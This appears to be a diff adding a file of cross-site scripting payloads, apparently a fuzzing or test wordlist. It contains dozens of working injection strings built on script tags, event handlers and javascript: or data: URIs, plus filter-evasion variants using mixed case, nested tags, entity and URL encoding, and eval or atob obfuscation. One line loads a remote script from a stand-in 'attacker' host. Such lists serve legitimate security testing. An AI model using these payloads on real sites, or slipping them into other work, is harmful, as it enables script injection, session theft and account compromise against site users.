@@ -1,0 +1,75 @@
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<script>alert`1`</script>
+<img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=window>
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script>alert`1`</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<svg/onload=alert(1)>
+<svg onload=alert`1`>
+<svg/onload=confirm(1)>
+<svg/onload=prompt(1)> <svg><script>alert(1)</script></svg> <img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`> <img src=x onerror=confirm(1)> <img src=x onerror=prompt(1)> <img src=x onerror=alert(String.fromCharCode(88,83,83))> <img src=x oNeRrOr=alert(1)> <img src=x onerror=alert&#40;1&#41;> <img src=x onerror=alert&#x28;1&#x29;> <img src=x onerror=alert&#000040;1&#000041;> <img src=x onerror=alert%281%29>
+<img src=x onerror=alert/**/(1)>
+<img src=x onerror=alert/*x*/(1)>
+<img src=x onerror=alert(1)//> <img src=x onerror=alert(1)%0A> <img src=x onerror=alert(1)%0D> <img src=x onerror=alert(1)%09> <img src=x onerror=alert(1)%0C>
+<svg onload=alert(1)//> <svg onload=alert(1)%0A> <svg onload=alert(1)%09> <svg onload=alert(1)%0D> <svg onload=alert(1)%0C> <svg onload=alert&lpar;1&rpar;> <svg onload=alert&#40;document.domain&#41;> <img src=x onerror=alert&#40;document.domain&#41;>
+<img src=x onerror=alert(document['domain'])> <img src=x onerror=window> <img src=x onerror=this> <img src=x onerror=top> <img src=x onerror=self> <img src=x onerror=parent> <img src=x onerror=window.alert(1)>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=setTimeout('alert(1)')>
+<img src=x onerror=setInterval('alert(1)')>
+<img src=x onerror=location='javascript:alert(1)'>
+<img src=x onerror=document.write('<script>alert(1)</script>')>
+<img src=x onerror=document.body.innerHTML='<img src=x onerror=alert(1)>'>
+<iframe src=javascript:alert(1)>
+<iframe src=javascript:confirm(1)>
+<iframe src=javascript:prompt(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href=javascript:alert(1)>x</a>
+<a href=javascript:confirm(1)>x</a>
+<a href=javascript:prompt(1)>x</a>
+<object data=javascript:alert(1)>
+<object data=javascript:confirm(1)>
+<object data=javascript:prompt(1)>
+<embed src=javascript:alert(1)>
+<embed src=javascript:confirm(1)>
+<embed src=javascript:prompt(1)>
+<script src=data:,alert(1)></script>
+<script src=data:text/javascript,alert(1)></script>
+<script src=//attacker/xss.js></script>
+<script>top</script>
+<script>window</script>
+<script>this</script>
+<script>self</script>
+<script>parent</script>
+<script>eval('al'+'ert(1)')</script>
+<script>Function('al'+'ert(1)')()</script>
+<script>setTimeout('al'+'ert(1)')</script>
+<script>setInterval('al'+'ert(1)')</script>
+<script>alert(/\x58\x53\x53/)</script>
+<script>alert(unescape('%58%53%53'))</script>
+<script>alert(decodeURI('%58%53%53'))</script>
+<script>alert(decodeURIComponent('%58%53%53'))</script>
+<script>alert(atob('WFNT'))</script>
+<script>alert(btoa('XSS'))</script>
+<svg/onload=alert(/\x58\x53\x53/)>
+<img src=x onerror=alert(/\x58\x53\x53/)>
+<script>alert(1337)</script>
+<img src=x onerror=alert(1337)>
+<svg onload=alert(1337)>
+<input autofocus onfocus=alert(1337)>
+<details open ontoggle=alert(1337)>
+<marquee onstart=alert(1337)>
+<body onload=alert(1337)>
+<script>alert(Date.now())</script>
+<img src=x onerror=alert(Date.now())>
+<svg onload=alert(Date.now())>
+<script>alert(/XSS/)</script>
+<img src=x onerror=alert(/XSS/)>
+<svg onload=alert(/XSS/)>
+<%0ASvg/On%0Aload=aler%0At(1)>
